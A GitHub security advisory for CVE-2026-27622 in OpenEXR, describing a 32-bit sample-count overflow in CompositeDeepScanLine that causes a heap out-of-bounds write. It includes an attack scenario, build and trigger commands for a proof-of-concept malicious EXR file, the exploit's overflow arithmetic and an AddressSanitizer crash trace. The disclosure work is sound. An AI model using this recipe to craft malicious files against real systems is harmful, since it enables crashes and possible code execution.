# [H] OpenEXR's CompositeDeepScanLine integer-overflow leads to heap OOB write

## Summary
Severity: High
Advisory: GHSA-cr4v-6jm6-4963
CVE: CVE-2026-27622
CWE: CWE-787
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-03-02
Source: https://github.com/advisories/GHSA-cr4v-6jm6-4963
Type: github-advisory

## Affected
- PyPI: `OpenEXR` — affected >=2.3.0 <3.2.6
- PyPI: `OpenEXR` — affected >=3.3.0 <3.3.8
- PyPI: `OpenEXR` — affected >=3.4.0 <3.4.6

## Details
## Summary

Function: `CompositeDeepScanLine::readPixels`, reachable from high-level multipart deep read flows (`MultiPartInputFile` + `DeepScanLineInputPart` + `CompositeDeepScanLine`).

Vulnerable lines (`src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp`):
- `total_sizes[ptr] += counts[j][ptr];` (line ~511)
- `overall_sample_count += total_sizes[ptr];` (line ~514)
- `samples[channel].resize (overall_sample_count);` (line ~535)

Impact: 32-bit sample-count accumulation wrap leads to undersized allocation, then decode writes with true sample volume, causing heap OOB write in `generic_unpack_deep_pointers` (`src/lib/OpenEXRCore/unpack.c:1374`) (DoS/Crash, memory corruption/RCE).

Attack scenario:
- Attacker provides multipart deep EXR with many parts and very large sample counts per pixel.
- Uses compression (RLE/ZIPS) to keep file size relatively small vs decode pressure.
- The overflow happens in composite sample accounting (`unsigned int`), while pointer progression for decode uses larger counters and reaches out-of-bounds.

Tested on: `OpenEXR 4.0.0-dev` (commit 83449669402080874b25ff1fa740649a9e6ea064) but this code has existed since v2.3.0

## Steps to reproduce

[composite_deepscanline_poc_bundle.patch](https://github.com/user-attachments/files/25383205/composite_deepscanline_poc_bundle.patch)

PoC files used:
- Writer/generator: `poc/composite_deep_scanline_e2e_compressed_poc.cpp`
- Minimal high-level reader harness: `poc/simple_exr_reader.cpp`

The reader harness intentionally mimics realistic app behavior: open EXR, iterate parts, select `DEEPSCANLINE`, add sources to `CompositeDeepScanLine`, bind a normal `FrameBuffer`, then call `readPixels`.

Build with ASAN/UBSAN:

```bash
cmake -S . -B build-asan \
  -DOPENEXR_BUILD_POC=ON \
  -DCMAKE_BUILD_TYPE=RelWithDebInfo \
  -DCMAKE_C_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \
  -DCMAKE_CXX_FLAGS='-fsanitize=address,undefined -fno-omit-frame-pointer' \
  -DCMAKE_EXE_LINKER_FLAGS='-fsanitize=address,undefined' \
  -DCMAKE_SHARED_LINKER_FLAGS='-fsanitize=address,undefined'

cmake --build build-asan --target composite_writer simple_exr_reader -j
```

Generate malicious file (decode-path focused profile):

```bash
ASAN_OPTIONS=detect_leaks=0 timeout 180s \
  ./build-asan/poc/composite_writer \
  --profile low-ram \
  --file /tmp/composite_decode_focus.exr
```

Trigger:

```bash
ASAN_OPTIONS=detect_leaks=0 timeout 30s \
  ./build-asan/poc/simple_exr_reader /tmp/composite_decode_focus.exr
```

ASAN builds are slower. If needed, a non-sanitized build + debugger is faster for iteration.

## Example runs

Writer (abbrev):

```bash
❯ ./build-asan/poc/composite_writer
exploit math:
  benign samples                 : 300
  malicious parts                : 86
  malicious samples per part     : 50000000
  true total samples             : 4300000300
  uint32 overflow reached        : yes
  wrapped uint32 total           : 5033004
  composite Z/A alloc from wrap  : 40264032 bytes (38.40 MiB)
  per-part unpacked sample bytes : 300000000 bytes (286.10 MiB)
  min parts to overflow (current benign/samples): 86
writing compressed multipart deep EXR: /tmp/composite_deep_scanline_e2e_compressed.exr
writing donor malicious part (50000000 samples)
copying malicious part 1/86 from donor chunk
...
file size: 26112896 bytes (24.90 MiB)
```

Reader ASAN crash:

```bash
❯ ./build-asan/poc/simple_exr_reader
reading /tmp/composite_overflow_optimized.exr with 16 deepscanline parts
=================================================================
==175024==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7ed1a55d90b0 at pc 0x7ed1da7854f7 bp 0x7ffe8c83a680 sp 0x7ffe8c83a670
WRITE of size 4 at 0x7ed1a55d90b0 thread T0
    #0 0x7ed1da7854f6 in generic_unpack_deep_pointers /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374
    #1 0x7ed1da7623e9 in exr_decoding_run /home/pop/sec/openexr/src/lib/OpenEXRCore/decoding.c:664
    #2 0x7ed1dbcb153b in run_decode /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:816
    #3 0x7ed1dbcc597f in Imf_4_0::DeepScanLineInputFile::Data::readData(Imf_4_0::DeepFrameBuffer const&, int, int, bool) /home/pop/sec/openexr/src/lib/OpenEXR/ImfDeepScanLineInputFile.cpp:568
    #4 0x7ed1dbc01ca4 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:576
    #5 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88
    #6 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #7 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #8 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)

0x7ed1a55d90b0 is located 0 bytes after 820132016-byte region [0x7ed1747b5800,0x7ed1a55d90b0)
allocated by thread T0 here:
    #0 0x7ed1dd0fe548 in operator new(unsigned long) ../../../../src/libsanitizer/asan/asan_new_delete.cpp:95
    #1 0x7ed1dbc29600 in std::__new_allocator<float>::allocate(unsigned long, void const*) /usr/include/c++/13/bits/new_allocator.h:151
    #2 0x7ed1dbc29600 in std::allocator_traits<std::allocator<float> >::allocate(std::allocator<float>&, unsigned long) /usr/include/c++/13/bits/alloc_traits.h:482
    #3 0x7ed1dbc29600 in std::_Vector_base<float, std::allocator<float> >::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:381
    #4 0x7ed1dbc29600 in std::_Vector_base<float, std::allocator<float> >::_M_allocate(unsigned long) /usr/include/c++/13/bits/stl_vector.h:378
    #5 0x7ed1dbc29600 in std::vector<float, std::allocator<float> >::_M_default_append(unsigned long) /usr/include/c++/13/bits/vector.tcc:663
    #6 0x7ed1dbc00184 in std::vector<float, std::allocator<float> >::resize(unsigned long) /usr/include/c++/13/bits/stl_vector.h:1016
    #7 0x7ed1dbc00184 in Imf_4_0::CompositeDeepScanLine::readPixels(int, int) /home/pop/sec/openexr/src/lib/OpenEXR/ImfCompositeDeepScanLine.cpp:535
    #8 0x64669005f233 in main /home/pop/sec/openexr/poc/simple_exr_reader.cpp:88
    #9 0x7ed1d942a1c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #10 0x7ed1d942a28a in __libc_start_main_impl ../csu/libc-start.c:360
    #11 0x6466900601e4 in _start (/home/pop/sec/openexr/build-asan/poc/simple_exr_reader+0x1b1e4) (BuildId: 86b018d0dce48def6ca06be031266f0205c914d2)

SUMMARY: AddressSanitizer: heap-buffer-overflow /home/pop/sec/openexr/src/lib/OpenEXRCore/unpack.c:1374 in generic_unpack_deep_pointers
Shadow bytes around the buggy address:
  0x7ed1a55d8e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ed1a55d8e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ed1a55d8f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ed1a55d8f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ed1a55d9000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7ed1a55d9080: 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa fa
  0x7ed1a55d9100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7ed1a55d9180: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7ed1a55d9200: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7ed1a55d9280: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7ed1a55d9300: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==175024==ABORTING
```

## Root cause analysis

In `CompositeDeepScanLine::readPixels`:

1. Per-pixel totals are accumulated in `vector<unsigned int> total_sizes`.
2. For attacker-controlled large counts across many parts, `total_sizes[ptr]` wraps modulo `2^32`.
3. `overall_sample_count` is then derived from wrapped totals and used in `samples[channel].resize(overall_sample_count)`.
4. Decode pointer setup/consumption proceeds with true sample counts, and write operations in core unpack (`generic_unpack_deep_pointers`) overrun the undersized composite sample buffer.


Allocation is based on a tiny wrapped value, but decode writes correspond to the true large sample volume.

## Impact

Heap OOB write during decode. This is at minimum a reliable crash/DoS. As heap corruption, this bug could be used for potential remote code execution.

## References
- https://github.com/AcademySoftwareFoundation/openexr/security/advisories/GHSA-cr4v-6jm6-4963
- https://nvd.nist.gov/vuln/detail/CVE-2026-27622
- https://github.com/AcademySoftwareFoundation/openexr
